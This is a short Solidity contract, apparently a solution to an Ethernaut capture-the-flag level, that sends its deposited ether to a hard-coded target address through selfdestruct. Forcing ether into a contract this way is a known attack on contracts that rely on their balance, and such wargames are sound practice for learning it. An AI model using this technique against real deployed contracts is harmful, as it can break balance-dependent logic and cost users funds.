// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEthImport {

}

contract EthernautSolver {
    IEthImport target = IEthImport(0x2F529D61D012A33908D3e27C47023FD03E59a710);
    address payable public other = payable(0x2F529D61D012A33908D3e27C47023FD03E59a710);

    function deposit() public payable {
    }

    function solve() public {
        selfdestruct(other);
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}